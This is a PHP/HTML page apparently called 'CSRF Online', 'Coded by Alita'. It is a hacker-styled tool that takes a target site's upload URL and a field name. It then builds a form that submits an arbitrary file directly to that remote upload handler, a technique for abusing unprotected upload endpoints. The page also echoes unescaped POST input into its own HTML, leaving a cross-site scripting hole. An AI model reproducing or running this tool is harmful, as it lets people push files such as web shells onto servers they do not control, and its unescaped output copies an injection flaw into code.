<!DOCTYPE html>
<html>
	<head>
		<title>CSRF Online</title>
		<link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a6/Anonymous_emblem.svg/1200px-Anonymous_emblem.svg.png">
		<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css">
		<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
	</head>
	<body>
	</body>
</html>
<div class="area">
  <div class="container">
      <div class="card text-center">
        <div class="card-header">
            <div class="card-title">
                <h1>CSRF Online</h1>
                <i>Coded by Alita</i>
            </div>
        </div>
        <div class="card-text px-4 mt-4">
        		<form method="post">
        				URL Target:<br>
								<input type="text" name="action" class="form-control" required placeholder="http://site.com/upload.php"><br>
								POST File:<br>
								<input type="text" name="name" class="form-control" placeholder="file"><br>
		            <input type="submit" class="btn text-white" value="Submit"><br>
        		</form>
<?php if(isset($_POST['action']) && isset($_POST['name'])):?>
						<hr>
    				<form method="post" target="_blank" action="<?php echo $_POST['action'];?>" enctype="multipart/form-data">
    						<div class="custom-file">
									<input type="file" class="custom-file-input" id="file" name="<?php echo $_POST['name'];?>">
									<label class="custom-file-label" for="file">Choose file...</label>
								</div>
								<br><br>
		            <input type="submit" class="btn text-white" value="Upload"><br><br>
    				</form>
<?php endif;?>
        </div>
      </div>
  </div>
</div>
<style>
	.area {
		height: 100vh;
		display: flex;
		align-items: center;
		justify-content: center 
	}
	.area .container {
		margin: 0 
	}
	body {
		background-color:#000000; 
		background-image:url('https://i.imgur.com/hLcQCBx.gif');
	}
	.form-control, .form-control:focus, .card, .custom-file-label {
		background-color: transparent;
		color: white;
	}
	.btn {
		border-color: #39ff14;
	}
</style>
<script>
	$("#file").change(function(){
		 $('.custom-file-label').text($(this).val());
	});
</script>
